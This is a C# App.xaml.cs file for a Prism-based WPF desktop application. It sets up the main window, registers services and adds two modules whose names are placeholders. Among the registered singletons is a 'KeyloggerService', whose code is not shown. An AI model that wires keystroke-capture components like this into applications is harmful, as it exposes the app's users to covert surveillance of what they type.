using FullApp.Modules.ModuleName;
using FullApp.Modules.ModuleName_2;
using FullApp.Services;
using FullApp.Services.Interfaces;
using FullApp.SharedServices;
using FullApp.SharedServices.Interface;
using FullApp.Views;
using Prism.Ioc;
using Prism.Modularity;
using System.Windows;

namespace FullApp
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App
    {
        protected override Window CreateShell()
        {
            return Container.Resolve<MainWindow>();
        }

        protected override void RegisterTypes(IContainerRegistry containerRegistry)
        {
            containerRegistry.RegisterSingleton<IMessageService, MessageService>();
            containerRegistry.RegisterSingleton<IDatabaseService, DatabaseService>();
            containerRegistry.RegisterSingleton<IKeyloggerService, KeyloggerService>();
        }

        protected override void ConfigureModuleCatalog(IModuleCatalog moduleCatalog)
        {
            moduleCatalog.AddModule<ModuleNameModule>();
            moduleCatalog.AddModule<ModuleName_2Module>();
        }
    }
}
